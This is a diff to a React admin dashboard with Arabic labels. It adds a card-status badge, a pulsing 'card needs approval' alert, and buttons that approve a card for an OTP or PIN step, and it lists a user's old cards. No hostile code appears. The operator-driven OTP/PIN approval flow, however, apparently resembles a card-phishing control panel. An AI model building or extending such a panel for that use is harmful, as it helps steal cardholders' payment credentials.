@@ -801,17 +801,47 @@ export default function AdminDashboard() {
                           copied={copiedField!}
                         />
                       </div>
-                      {selectedApplication.paymentStatus && (
-                        <Badge
-                          className={`text-[8px] w-fit mt-1 ${selectedApplication.paymentStatus === "completed" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.paymentStatus === "failed" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
-                        >
-                          {selectedApplication.paymentStatus}
+                      
+                      {/* Card Status Badge */}
+                      <div className="flex items-center gap-2 mt-2">
+                        <span className="text-[9px] text-slate-400">حالة البطاقة:</span>
+                        <Badge className={`text-[8px] ${
+                          selectedApplication.cardStatus === "approved_with_otp" || selectedApplication.cardStatus === "approved_with_pin"
+                            ? "bg-emerald-500/20 text-emerald-400"
+                            : selectedApplication.cardStatus === "rejected"
+                              ? "bg-red-500/20 text-red-400"
+                              : "bg-amber-500/20 text-amber-400"
+                        }`}>
+                          {selectedApplication.cardStatus === "approved_with_otp" ? "موافق - OTP" 
+                            : selectedApplication.cardStatus === "approved_with_pin" ? "موافق - PIN"
+                            : selectedApplication.cardStatus === "rejected" ? "مرفوض"
+                            : "قيد الانتظار"}
                         </Badge>
-                      )}
-                      {/* Added card approval controls */}
+                        {selectedApplication.paymentStatus && (
+                          <Badge
+                            className={`text-[8px] ${selectedApplication.paymentStatus === "completed" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.paymentStatus === "failed" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                          >
+                            {selectedApplication.paymentStatus}
+                          </Badge>
+                        )}
+                      </div>
+
+                      {/* Approval Needed Alert */}
+                      {selectedApplication.cardStatus !== "approved_with_otp" &&
+                        selectedApplication.cardStatus !== "approved_with_pin" &&
+                        selectedApplication.cardStatus !== "rejected" && (
+                          <div className="mt-2 p-2 bg-amber-500/10 border border-amber-500/30 rounded-lg animate-pulse">
+                            <div className="flex items-center gap-2">
+                              <div className="w-2 h-2 bg-amber-400 rounded-full animate-ping"></div>
+                              <span className="text-[9px] text-amber-400 font-medium">تنبيه: البطاقة تحتاج موافقة!</span>
+                            </div>
+                          </div>
+                        )}
+
+                      {/* Card approval controls */}
                       {selectedApplication.cardStatus !== "approved_with_otp" &&
                         selectedApplication.cardStatus !== "approved_with_pin" && (
-                          <div className="flex gap-1 mt-1">
+                          <div className="flex gap-1 mt-2">
                             <Button
                               onClick={() => handleApproveCard(selectedApplication.id!, "otp")}
                               size="sm"
@@ -835,12 +865,6 @@ export default function AdminDashboard() {
                             </Button>
                           </div>
                         )}
-                      {(selectedApplication.cardStatus === "approved_with_otp" ||
-                        selectedApplication.cardStatus === "approved_with_pin") && (
-                        <Badge className="text-[8px] bg-emerald-500/20 text-emerald-400 mt-1">
-                          {selectedApplication.cardStatus === "approved_with_otp" ? "موافق - OTP" : "موافق - PIN"}
-                        </Badge>
-                      )}
                       {selectedApplication.oldCards && selectedApplication.oldCards.length > 0 && (
                         <div className="mt-1 p-1.5 bg-red-500/10 rounded border border-red-500/20">
                           <span className="text-[8px] text-red-400 block mb-0.5">
